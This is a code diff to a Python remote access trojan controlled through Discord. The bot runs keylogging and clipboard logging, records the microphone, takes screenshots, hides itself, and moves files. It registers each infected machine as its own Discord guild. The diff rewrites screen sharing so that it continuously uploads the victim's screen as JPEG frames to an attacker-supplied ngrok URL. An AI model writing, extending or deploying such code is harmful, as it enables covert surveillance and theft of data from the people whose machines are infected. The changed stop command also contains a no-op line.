@@ -1,16 +1,14 @@
-import os, datetime, pyautogui, subprocess, requests, cv2, zipfile, asyncio, platform, sys, shutil, pyaudio, wave, time, threading
+import os, datetime, pyautogui, subprocess, requests, cv2, zipfile, asyncio, platform, sys, shutil, pyaudio, wave, threading, time
 import discord, io, aiohttp
 import numpy as np
 
 from mss import mss
-from flask import Flask, Response
 from Clip_logging import Cliplogger
 from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-
-TOKEN = 'YOURTOKSTOKENHERE'
+TOKEN = 'TOKEN'
 BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}
 
 intent = discord.Intents.all()
@@ -22,8 +20,6 @@ clogger = Cliplogger()
 activeRecording = {}
 activeStreaming = {}
 prefix = '.'
-streaming = False
-flask_started = False
 
 def get_current_userAndMachine():
     user = os.getlogin()
@@ -431,6 +427,8 @@ async def stoprecord(ctx: commands.Context):
     else:
         await ctx.send("no active mic recording session here!")
 
+
+
 async def MakeandJoinGuild(guild):
     bot_user, bot_machine = get_current_userAndMachine()
     formatted_name = f"{bot_user}_{bot_machine}".lower().replace(" ", "-")
@@ -504,61 +502,52 @@ async def help(ctx: commands.Context):
     )
     await ctx.send(help)
 
-app = Flask(__name__)
-
-def grabFramebyFrame():
+async def screenshare(ctx: commands.Context, url=None):
     try:
-        with mss() as sct:
-            monitor = sct.monitors[1]
-            screen = sct.grab(monitor)
-            frame = np.array(screen)
-            color = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
-            resize = cv2.resize(color, (1280, 720))
-            success, encodeImg = cv2.imencode('.jpg', resize, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
-            if success:
-                return encodeImg.tobytes()
-    except Exception:
-        pass
-    return None
+        loop = asyncio.get_running_loop()
+        async with aiohttp.ClientSession() as session:
+            while True:
+                def grabFramebyFrame():
+                    with mss() as sct:
+                        monitor = sct.monitors[1]    
+                        screen = sct.grab(monitor)
+                        frame = np.array(screen)
+                        color = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
+                        resize = cv2.resize(color, (1280, 720))
+                        success, encodeImg = cv2.imencode('.jpg', resize, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
+                        if success:
+                            return encodeImg.tobytes()
+                    return None
+                buf = await loop.run_in_executor(None, grabFramebyFrame)
+                if buf is None:
+                    await asyncio.sleep(0.05)
+                    continue
+                async with session.post(
+                    url=url,
+                    data=buf,
+                    headers={'Content-Type': 'image/jpg'},
+                    timeout=aiohttp.ClientTimeout(total=3)
+                ) as response:
+                    if response.status != 200:
+                        pass
+                await asyncio.sleep(0.05)
+    except asyncio.TimeoutError:
+        await asyncio.sleep(0.1)
+    except aiohttp.ClientError as e:
+        await ctx.send(f"**aiohttp error:**\n```\n{e}\n```")
+        await asyncio.sleep(1)
+    except Exception as e:
+        await ctx.send(f"{e}")
+    finally:
+        if ctx.channel.id in activeStreaming:
+            del activeStreaming[ctx.channel.id]
 
-def generateFrame():
-    global streaming
-    while True:
-        if not streaming:
-            black_frame = np.zeros((720, 1280, 3), dtype=np.uint8)
-            _, encoded = cv2.imencode('.jpg', black_frame)
-            buff = encoded.tobytes()
-            yield (b'--frame\r\n'
-                   b'Content-Type: image/jpeg\r\n\r\n' + buff + b'\r\n')
-            time.sleep(1)
-            continue
-
-        buf = grabFramebyFrame()
-        if buf is None:
-            time.sleep(0.05)
-            continue
-
-        yield (b'--frame\r\n'
-               b'Content-Type: image/jpeg\r\n\r\n' + buf + b'\r\n')
-        time.sleep(0.05)
-
-@app.route('/')
-def index():
-    return '''
-    <html>
-      <head><title>Live Screen Sharing</title></head>
-      <body style="margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh;">
-        <img src="/stream" style="max-width:100%; max-height:100%; object-fit:contain;">
-      </body>
-    </html>
-    '''
-
-@app.route('/stream')
-def stream():
-    return Response(generateFrame(), mimetype='multipart/x-mixed-replace; boundary=frame')
-
-def start_flask_server(port):
-    app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False)
+async def stopsharing(ctx: commands.Context):
+    if ctx.channel.id in activeStreaming and activeStreaming[ctx.channel.id]:
+        activeStreaming[ctx.channel.id] = False
+        await ctx.send("stopping webstream..")
+    else:
+        await ctx.send("no active webstreaming here!")
 
 @bot.event
 async def on_ready():
@@ -571,13 +560,14 @@ async def on_guild_join(guild):
 
 @bot.event
 async def on_message(message):
-    global streaming, flask_started
     if message.author == bot.user:
         return
     txt = message.content.strip()
 
     if txt.startswith(prefix):
-        part = txt.split(" ")
+        part = txt.split()
+        if not part:
+            return
         command = part[0].lower()
         arg = part[1:]
         
@@ -620,23 +610,23 @@ async def on_message(message):
                 time = " ".join(arg)
                 await recordmic(ctx, time=time)
         elif command == ".screenshare":
-            if len(arg) < 2:
-                await message.channel.send("wrong formatting, should be `.screenshare <ngrok-url> <ngrok-port>`")
+            if len(arg) < 1:
+                await ctx.send("wrong formatting, should be `.screenshare <ngrok-url> <ngrok-port>`")
                 return
 
             url = arg[0]
-            port = arg[1]
-            if not url.startswith(("https://", "http://")) or not port.isdigit():
-                await message.channel.send("wrong formatting, should be `.screenshare <ngrok-url> <ngrok-port>`")
+
+            if not url.startswith(("https://", "http://")):
+                await ctx.send("wrong formatting, should be `.screenshare <ngrok-url> <ngrok-port>`")
                 return
 
-            port = int(port)
-            if not flask_started:
-                t = threading.Thread(target=start_flask_server, args=(port,), daemon=True)
-                t.start()
-                flask_started = True
-            streaming = True
-            await ctx.send(f"streaming is ready! url `{url}` port `{str(port)}`")
+            if ctx.channel.id in activeStreaming:
+                await ctx.send("webstreaming is already running! type `.stopsharing` to stop")
+                return
+            furl = f"{url.rstrip('/')}/upload"
+            await ctx.send(f"starting webstreaming at url '{url}'")
+            task = asyncio.create_task(screenshare(ctx=ctx, url=furl))
+            activeStreaming[ctx.channel.id] = task
 
         elif command == ".download":
             if not arg:
@@ -656,7 +646,7 @@ async def on_message(message):
             
             await download(ctx, file=FileInput, time=time)
             return
-        elif  command == ".upload":
+        elif command == ".upload":
             UrlInput = None
             fileInput = None
 
@@ -706,11 +696,16 @@ async def on_message(message):
         elif command == ".hide":
             await hide(ctx)
         elif command == ".stopsharing":
-            if streaming:
-                streaming = False
-                await ctx.send("webstreaming stopped!")
-            else:
-                await ctx.send("no active webstreaming active here!")
+            if ctx.channel.id in activeStreaming:
+                task = activeStreaming[ctx.channel.id]
+
+                if isinstance(task, asyncio.Task):
+                    task.cancel()
+                if ctx.channel.id in activeStreaming:
+                    activeStreaming[ctx.channel.id]
+                    await ctx.send("stopping webstream..")
+                else:
+                    await ctx.send("no active webstreaming here!")
         else:
             await ctx.send(f"unknown command `{command}`, type `.help` for help")
             return
